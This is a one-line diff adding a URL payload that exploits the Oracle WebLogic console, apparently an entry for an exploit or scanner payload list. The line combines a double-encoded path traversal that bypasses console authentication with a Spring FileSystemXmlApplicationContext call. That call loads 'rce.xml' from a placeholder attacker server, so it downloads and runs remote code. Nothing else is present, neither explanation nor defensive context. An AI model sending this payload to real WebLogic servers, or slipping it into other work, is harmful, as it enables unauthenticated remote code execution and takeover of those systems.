@@ -1,0 +1,1 @@
+/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://#httpserver#:8808/rce.xml")
